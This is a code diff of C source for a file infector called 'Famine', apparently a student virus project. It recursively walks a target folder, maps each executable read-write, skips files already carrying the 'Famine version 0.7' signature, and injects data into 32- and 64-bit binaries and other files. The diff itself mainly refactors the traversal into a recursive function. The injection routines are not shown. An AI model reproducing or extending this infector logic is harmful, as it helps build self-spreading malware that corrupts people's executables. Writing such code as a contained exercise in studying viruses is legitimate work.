@@ -2,50 +2,92 @@
 
 int inject_data(unsigned char *file) {
     int archi = file[4];
-    if (archi == 1) {
-        // printf("exec 32bits\n");
+    if (archi == 1)
         handle_32(file);
-    }
-    else if (archi == 2) {
-        // printf("exec 64bits\n");
+    else if (archi == 2)
         handle_64(file);
-    }
-    else {
-        printf("File nn gere\n");
+    else
         return -1;
-    }
     return 0;
 }
 
 int open_file(char *name_file) {
     int fd = open(name_file, O_RDWR);
-    if (fd == -1){
-        perror("");
+    if (fd == -1)
         return -1;
-    }
     unsigned long file_size = lseek(fd, 0, SEEK_END);
     if (file_size <= 0){
-        write(2, "File empty\n", 11);
         close(fd);
         return -1;
     }
 
     unsigned char *file = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
     if (file == MAP_FAILED) {
-        perror("mmap");
+        close(fd);
+        return -1;
+    }
+
+    if (memmem(file, file_size, "Famine version 0.7", strlen("Famine version 0.7"))) {
+        munmap(file, file_size);
         close(fd);
         return -1;
     }
 
     inject_data(file);
+    munmap(file, file_size);
     close(fd);
     return 0;
 }
 
-int main() {
-    char *name_folder[] = {"/tmp/test"};
-
+void enter_folder(char *folder, int *index, char **name_file_exec) {
     struct dirent *dir;
+
+    if (!strcmp(folder, "/home/zarbiy/Documents/Famine"))
+        return ;
+
+    DIR *d = opendir(folder);
+    if (d) {
+        while ((dir = readdir(d)) != NULL) {
+            char path[1024] = "\0";
+            if (dir->d_type == DT_REG) {
+                struct stat st;
+
+                snprintf(path, sizeof(path), "%s/%s", folder, dir->d_name);
+                if (stat(path, &st) == 0) {
+                    if (st.st_mode & S_IXUSR) {
+                        if (open_file(path) != -1) {
+                            // printf("File exec: %s\n", path);
+                            name_file_exec[*index] = strdup(path);
+                            *index += 1;
+                            if (ACTIVE_SHOW)
+                                exec_cmd(path, 0);
+                        }
+                    }
+                    else {
+                        if (handle_other_file(path) != -1) {
+                            // printf("File other: %s\n", path);
+                            name_file_exec[*index] = strdup(path);
+                            *index += 1;
+                            if (ACTIVE_SHOW)
+                                exec_cmd(path, 1);
+                        }
+                    }
+                }
+            }
+            else if (dir->d_type == DT_DIR) {
+                if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
+                    snprintf(path, sizeof(path), "%s/%s", folder, dir->d_name);
+                    enter_folder(path, index, name_file_exec);
+                }
+            }
+        }
+        closedir(d);
+    }
+    return ;
+}
+
+int main() {
+    char *name_folder[] = {"/tmp/test", NULL};
 
     int i = 0;
     char **name_file_exec = calloc(MAX_FILES, sizeof(char *));
@@ -56,49 +98,15 @@ int main() {
             i++;
             continue ;
         }
-
-        DIR *d = opendir(name_folder[i]);
-        if (d) {
-            while ((dir = readdir(d)) != NULL) {
-                if (dir->d_type == DT_REG) {
-                    char path[1024] = "\0";
-                    struct stat st;
-
-                    snprintf(path, sizeof(path), "%s/%s", name_folder[i], dir->d_name);
-                    if (stat(path, &st) == 0) {
-                        if (st.st_mode & S_IXUSR) {
-                            // printf("Handle file: %s %s\n", dir->d_name, path);
-                            if (open_file(path) != -1) {
-                                name_file_exec[index] = strdup(path);
-                                index += 1;
-                            }
-                        }
-                        else {
-                            // printf("Handle file: %s %s\n", dir->d_name, path);
-                            if (handle_other_file(path) != -1) {
-                                name_file_exec[index] = strdup(path);
-                                index += 1;
-                            }
-                        }
-                    }
-                }
-                else if (dir->d_type == DT_DIR) {
-                    if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
-                        char path[1024] = "\0";
-                        snprintf(path, sizeof(path), "%s/%s", name_folder[i], dir->d_name);
-                        printf("Path directory: %s\n", path);
-                    }
-                }
-            }
-            closedir(d);
-            if (index == 99) {
-                printf("Limit file reach !\n");
-                break;
-            }
+        enter_folder(name_folder[i], &index, name_file_exec);
+        if (index == MAX_FILES - 1) {
+            printf("Limit file reach !\n");
+            break;
         }
         i++;
     }
-    print_tab(name_file_exec);
+    
+    // print_tab(name_file_exec);
     free_tab(name_file_exec, index);
     return 0;
 }
